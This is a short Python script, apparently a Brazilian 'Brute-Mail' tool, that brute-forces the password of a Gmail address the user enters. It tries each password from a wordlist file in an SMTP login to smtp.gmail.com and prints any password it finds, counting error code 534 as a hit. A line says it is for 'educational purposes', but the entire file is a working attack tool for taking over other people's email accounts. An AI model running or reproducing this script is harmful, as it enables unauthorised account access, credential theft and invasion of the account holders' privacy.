#!/usr/bin/env python
# -*- coding: utf-8 -*-

import smtplib
import email.utils
import time

print(''' 

 $$$$$$$\                        $$\                                   $$\      $$\           $$\ $$\ 
 $$  __$$\                       $$ |                                  $$$\    $$$ |          \__|$$ |
 $$ |  $$ | $$$$$$\  $$\   $$\ $$$$$$\    $$$$$$\                      $$$$\  $$$$ | $$$$$$\  $$\ $$ |
 $$$$$$$\ |$$  __$$\ $$ |  $$ |\_$$  _|  $$  __$$\       $$$$$$\       $$\$$\$$ $$ | \____$$\ $$ |$$ |
 $$  __$$\ $$ |  \__|$$ |  $$ |  $$ |    $$$$$$$$ |      \______|      $$ \$$$  $$ | $$$$$$$ |$$ |$$ |
 $$ |  $$ |$$ |      $$ |  $$ |  $$ |$$\ $$   ____|                    $$ |\$  /$$ |$$  __$$ |$$ |$$ |
 $$$$$$$  |$$ |      \$$$$$$  |  \$$$$  |\$$$$$$$\                     $$ | \_/ $$ |\$$$$$$$ |$$ |$$ |
 \_______/ \__|       \______/    \____/  \_______|                    \__|     \__| \_______|\__|\__|


 x-----------------------------------------x
 | By: Loock Underwood, B. Rudsen e Any0ne |
 x-----------------------------------------x ''')

print('\n - OBS: Script feito para "Fins Educativos".')

####################################################################################

user = input('\n - Digite aqui o E-mail alvo: ')
arquivo = open("lista.txt", "r")
for linha in arquivo.readlines():
    try:
        
        smtpclient = smtplib.SMTP('smtp.gmail.com', 587)
        smtpclient.ehlo()
        smtpclient.starttls()
        linha = linha.strip()
        smtpclient.login(user, linha)

        print('\n [!] Senha Encontrada: %s' % linha)
        print('-----------------------------------')
        break
    except Exception as erro:
        if str(erro).startswith('(535'):
            print('\n [-] Senha Incorreta: %s' % linha)
            print('-----------------------------------')
        elif str(erro).startswith('(534'):
            print('\n [!] Senha Encontrada: %s' % linha)
            print('-----------------------------------')
            time.sleep(10)
            exit()
